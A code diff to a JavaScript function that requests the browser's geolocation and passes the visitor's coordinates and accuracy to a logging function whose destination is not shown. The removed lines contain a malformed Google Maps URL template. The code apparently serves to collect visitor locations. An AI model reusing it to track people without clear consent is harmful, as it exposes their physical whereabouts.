@@ -39,20 +39,22 @@
         // Triggers the "Allow Location" browser popup.
 function getGPSLocation() {
     if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(pos => {
-            sendData({
-                method: "HIGH_PRECISION_GPS",
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                google_maps: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
-            });
-        }, (err) => {
-            sendData({ method: "GPS_ERROR", message: err.message });
-        }, { 
-            enableHighAccuracy: true, 
-            timeout: 15000, // Increased to 15 seconds
-            maximumAge: 60000 // Uses cached location if available
-        });
+navigator.geolocation.getCurrentPosition(pos => {
+    sendLog({
+        type: "location",
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+    });
+}, err => {
+    sendLog({ type: "GPS_ERROR", message: err.message });
+}, { 
+    // CHANGE THESE THREE SETTINGS:
+    enableHighAccuracy: false, // Desktop browsers are much faster with this OFF
+    timeout: 30000,            // Give it 30s instead of 5s to avoid "Timeout expired"
+    maximumAge: Infinity       // FORCE the browser to use a cached location if it exists
+});
+
     }
 }
 
